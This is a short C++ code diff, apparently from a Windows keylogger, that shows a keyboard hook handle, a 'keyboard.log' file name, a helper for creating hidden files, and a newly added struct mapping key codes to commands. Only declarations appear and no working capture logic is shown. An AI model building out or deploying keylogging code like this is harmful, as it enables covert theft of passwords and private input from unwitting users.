@@ -23,7 +23,7 @@
 
 #define _CRT_SECURE_NO_DEPRECATE
 #define _KEYLOG_FILENAME_ "keyboard.log"
-#define debug FALSE
+bool debug=false;
 
 bool appendFile(char *filename, char letter);
 bool logFileExist(char *filename);
@@ -32,6 +32,11 @@ void createFile(char *filename, bool hidden);
 void detectCurrentCode();
 HHOOK keyboardHook;
 using namespace std;
+
+struct secretCode{
+    string keyCode;
+    string cmd;
+};
 
 string bufferString = "";
 
